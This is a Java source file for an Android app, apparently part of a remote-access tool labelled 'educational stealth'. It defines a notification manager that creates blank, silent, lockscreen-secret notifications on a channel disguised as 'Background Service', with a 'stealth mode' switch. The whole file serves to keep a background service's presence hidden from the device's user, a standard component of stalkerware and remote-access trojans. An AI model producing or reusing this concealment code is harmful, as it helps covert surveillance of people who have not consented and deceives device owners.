package com.remoteaccess.educational.stealth;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import androidx.core.app.NotificationCompat;

/**
 * SILENT NOTIFICATION MANAGER
 * 
 * Creates completely silent, invisible notifications for stealth mode
 * 
 * FEATURES:
 * - No sound
 * - No vibration
 * - No LED
 * - Minimal visibility
 * - Low priority
 */
public class SilentNotificationManager {

    private static final String CHANNEL_ID = "stealth_service";
    private static final String CHANNEL_NAME = "Background Service";
    private static final int NOTIFICATION_ID = 1001;
    
    private Context context;
    private NotificationManager notificationManager;

    public SilentNotificationManager(Context context) {
        this.context = context;
        this.notificationManager = (NotificationManager) context.getSystemService(Context.NOTIFICATION_SERVICE);
        createNotificationChannel();
    }

    /**
     * Create silent notification channel
     */
    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                CHANNEL_ID,
                CHANNEL_NAME,
                NotificationManager.IMPORTANCE_MIN  // Minimal importance
            );
            
            // Silent settings
            channel.setSound(null, null);
            channel.enableVibration(false);
            channel.enableLights(false);
            channel.setShowBadge(false);
            channel.setLockscreenVisibility(Notification.VISIBILITY_SECRET);
            channel.setDescription("Runs in background");
            
            notificationManager.createNotificationChannel(channel);
        }
    }

    /**
     * Create completely silent notification
     */
    public Notification createSilentNotification() {
        Intent intent = new Intent(context, context.getClass());
        PendingIntent pendingIntent = PendingIntent.getActivity(
            context, 
            0, 
            intent, 
            PendingIntent.FLAG_IMMUTABLE
        );

        NotificationCompat.Builder builder = new NotificationCompat.Builder(context, CHANNEL_ID)
            .setSmallIcon(android.R.drawable.ic_dialog_info)  // Generic icon
            .setContentTitle("")  // Empty title
            .setContentText("")   // Empty text
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setCategory(NotificationCompat.CATEGORY_SERVICE)
            .setOngoing(true)
            .setShowWhen(false)
            .setContentIntent(pendingIntent)
            .setSound(null)
            .setVibrate(null)
            .setLights(0, 0, 0);

        // For Android 8.0+
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            builder.setChannelId(CHANNEL_ID);
        }

        return builder.build();
    }

    /**
     * Create minimal visible notification (for non-stealth mode)
     */
    public Notification createMinimalNotification(String title, String text) {
        Intent intent = new Intent(context, context.getClass());
        PendingIntent pendingIntent = PendingIntent.getActivity(
            context, 
            0, 
            intent, 
            PendingIntent.FLAG_IMMUTABLE
        );

        NotificationCompat.Builder builder = new NotificationCompat.Builder(context, CHANNEL_ID)
            .setSmallIcon(android.R.drawable.ic_dialog_info)
            .setContentTitle(title)
            .setContentText(text)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .setCategory(NotificationCompat.CATEGORY_SERVICE)
            .setOngoing(true)
            .setContentIntent(pendingIntent)
            .setSound(null)
            .setVibrate(null);

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            builder.setChannelId(CHANNEL_ID);
        }

        return builder.build();
    }

    /**
     * Update notification based on stealth mode
     */
    public Notification getNotification(boolean stealthMode) {
        if (stealthMode) {
            return createSilentNotification();
        } else {
            return createMinimalNotification("Service Active", "Running in background");
        }
    }

    /**
     * Get notification ID
     */
    public int getNotificationId() {
        return NOTIFICATION_ID;
    }
}
